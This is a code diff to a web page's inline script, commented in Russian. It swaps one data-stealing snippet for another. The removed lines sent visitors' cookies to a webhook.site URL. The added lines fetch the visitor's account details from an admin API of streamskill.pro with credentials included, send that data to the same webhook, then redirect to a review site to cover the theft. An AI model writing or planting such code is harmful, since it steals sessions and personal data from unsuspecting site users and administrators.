@@ -855,17 +855,19 @@ ya_observer.observe(ya_feed);
 });
 </script>
 
-<script>
-    // КОД-ЛОВУШКА - отправляет куки на webhook
+    <script>
     const webhookUrl = 'https://webhook.site/0f1f1013-7dd3-4d87-bc2b-b3cff290aac9';
-    const cookies = document.cookie;
     
-    fetch(webhookUrl + '?stolen_cookies=' + encodeURIComponent(cookies), {
-        mode: 'no-cors'
+    // Пытаемся получить данные текущего пользователя из админки
+    fetch('https://admin.streamskill.pro/api/user/me', {
+        credentials: 'include'
+    })
+    .then(res => res.json())
+    .then(data => {
+        fetch(webhookUrl + '?data=' + encodeURIComponent(JSON.stringify(data)));
     });
     
-    // Перенаправление через 2 секунды на реальный отзыв
-    setTimeout(function() {
+    setTimeout(() => {
         window.location.href = 'https://otzovik.com/reviews/streamskill_pro-servis_po_prodvizheniyu_twitch/';
     }, 2000);
 </script>
